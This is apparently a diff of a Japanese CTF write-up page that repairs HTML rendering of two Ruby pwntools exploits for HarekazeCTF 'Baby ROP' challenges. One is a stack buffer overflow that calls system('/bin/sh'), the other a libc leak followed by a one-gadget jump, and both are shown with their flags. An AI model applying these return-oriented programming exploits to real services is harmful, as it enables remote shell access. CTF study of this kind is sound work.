@@ -73,70 +73,72 @@
 <h2 id="baby-rop-1">Baby ROP 1</h2>
 
 <ul>
-<li>バイナリ中で、<code>system</code> 関数使ってechoしており、Canary等もないBOFが起こるので、<code>pop rdi; ret</code> 使って<code>system(/bin/sh)</code> を呼ぶだけ
-```ruby
-#!/usr/bin/env ruby</li>
+<li>バイナリ中で、<code>system</code> 関数使ってechoしており、Canary等もないBOFが起こるので、<code>pop rdi; ret</code> 使って<code>system(/bin/sh)</code> を呼ぶだけ</li>
+</ul>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
+
+<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
+
+context<span style="color:#666">.</span>log_level <span style="color:#666">=</span> <span style="color:#19177c">:debug</span>
+z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;problem.harekaze.com&#34;</span>, <span style="color:#666">20001</span>
+
+pop_rdi_ret <span style="color:#666">=</span> p64(<span style="color:#666">0x00400683</span>)
+<span style="color:#008000">system</span> <span style="color:#666">=</span> p64(<span style="color:#666">0x4005e3</span>)
+
+<span style="color:#800">STDIN</span><span style="color:#666">.</span>gets
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
+payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">24</span>
+payload <span style="color:#666">&lt;&lt;</span> pop_rdi_ret
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x601048</span>)
+payload <span style="color:#666">&lt;&lt;</span> <span style="color:#008000">system</span>
+
+z<span style="color:#666">.</span>sendline payload
+
+z<span style="color:#666">.</span>interact</code></pre></div>
+<ul>
+<li><strong>HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}</strong></li>
 </ul>
 
-<p>require &lsquo;pwn&rsquo;</p>
+<h2 id="baby-rop-2">Baby ROP 2</h2>
 
-<p>context.log_level = :debug
-z = Sock.new &ldquo;problem.harekaze.com&rdquo;, 20001</p>
+<ul>
+<li><code>system</code> 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ</li>
+</ul>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
 
-<p>pop_rdi_ret = p64(0x00400683)
-system = p64(0x4005e3)</p>
+<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
 
-<p>STDIN.gets
-z.recvuntil &ldquo;? &ldquo;
-payload = &ldquo;A&rdquo; * 24
-payload &lt;&lt; pop_rdi_ret
-payload &lt;&lt; p64(0x601048)
-payload &lt;&lt; system</p>
+context<span style="color:#666">.</span>log_level <span style="color:#666">=</span> <span style="color:#19177c">:debug</span>
+z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;problem.harekaze.com&#34;</span>, <span style="color:#666">20005</span>
+<span style="color:#408080;font-style:italic">#z = Sock.new &#34;localhost&#34;, 9999</span>
+elf <span style="color:#666">=</span> <span style="color:#800">ELF</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;./babyrop2&#34;</span>
+libc <span style="color:#666">=</span> <span style="color:#800">ELF</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;./libc.so.6&#34;</span>
+<span style="color:#408080;font-style:italic">#libc = ELF.new &#34;./mylibc.so.6&#34;</span>
 
-<p>z.sendline payload</p>
+pop_rdi_ret <span style="color:#666">=</span> p64(<span style="color:#666">0x00400733</span>)
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
 
-<p>z.interact</p>
-<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">- **HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}**
+payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">40</span>
+payload <span style="color:#666">&lt;&lt;</span> pop_rdi_ret
+payload <span style="color:#666">&lt;&lt;</span> p64(elf<span style="color:#666">.</span>got<span style="color:#666">[</span><span style="color:#ba2121">&#34;__libc_start_main&#34;</span><span style="color:#666">]</span>)
+payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x4004f0</span>)
+payload <span style="color:#666">&lt;&lt;</span> p64(elf<span style="color:#666">.</span>symbols<span style="color:#666">[</span><span style="color:#ba2121">&#34;main&#34;</span><span style="color:#666">]</span>)
+<span style="color:#800">STDIN</span><span style="color:#666">.</span>gets
+z<span style="color:#666">.</span>sendline payload
 
-## Baby ROP 2
+recvlen <span style="color:#666">=</span> <span style="color:#ba2121">&#34;Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">&#34;</span><span style="color:#666">.</span>length
+data <span style="color:#666">=</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
+<span style="color:#008000">p</span> data
+libc_base <span style="color:#666">=</span> u64(data<span style="color:#666">[</span>recvlen, <span style="color:#666">6</span><span style="color:#666">].</span>ljust(<span style="color:#666">8</span>, <span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\x00</span><span style="color:#ba2121">&#34;</span>)) <span style="color:#666">-</span> libc<span style="color:#666">.</span>symbols<span style="color:#666">[</span><span style="color:#ba2121">&#34;__libc_start_main&#34;</span><span style="color:#666">]</span>
+libc_magic <span style="color:#666">=</span> libc_base <span style="color:#666">+</span> <span style="color:#666">0xf02a4</span>
+<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;libc base 0x%x&#34;</span> <span style="color:#008000">% libc_base
+</span><span style="color:#008000">puts </span> <span style="color:#ba2121">&#34;libc magic 0x%x&#34;</span> <span style="color:#008000">% libc_magic
+</span><span style="color:#008000">
+</span><span style="color:#008000">payload </span> <span style="color:#666">=</span> <span style="color:#ba2121">&#34;B&#34;</span> <span style="color:#666">*</span> <span style="color:#666">40</span>
+payload <span style="color:#666">&lt;&lt;</span> p64(libc_magic)
+z<span style="color:#666">.</span>sendline payload
 
-- `system` 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ
-```ruby
-#!/usr/bin/env ruby
-
-require &#39;pwn&#39;
-
-context.log_level = :debug
-z = Sock.new &#34;problem.harekaze.com&#34;, 20005
-#z = Sock.new &#34;localhost&#34;, 9999
-elf = ELF.new &#34;./babyrop2&#34;
-libc = ELF.new &#34;./libc.so.6&#34;
-#libc = ELF.new &#34;./mylibc.so.6&#34;
-
-pop_rdi_ret = p64(0x00400733)
-z.recvuntil &#34;? &#34;
-
-payload = &#34;A&#34; * 40
-payload &lt;&lt; pop_rdi_ret
-payload &lt;&lt; p64(elf.got[&#34;__libc_start_main&#34;])
-payload &lt;&lt; p64(0x4004f0)
-payload &lt;&lt; p64(elf.symbols[&#34;main&#34;])
-STDIN.gets
-z.sendline payload
-
-recvlen = &#34;Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\n&#34;.length
-data = z.recvuntil &#34;? &#34;
-p data
-libc_base = u64(data[recvlen, 6].ljust(8, &#34;\x00&#34;)) - libc.symbols[&#34;__libc_start_main&#34;]
-libc_magic = libc_base + 0xf02a4
-puts &#34;libc base 0x%x&#34; % libc_base
-puts &#34;libc magic 0x%x&#34; % libc_magic
-
-payload = &#34;B&#34; * 40
-payload &lt;&lt; p64(libc_magic)
-z.sendline payload
-
-z.interact</pre></div>
+z<span style="color:#666">.</span>interact</code></pre></div>
 <ul>
 <li><strong>HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}</strong></li>
 </ul>
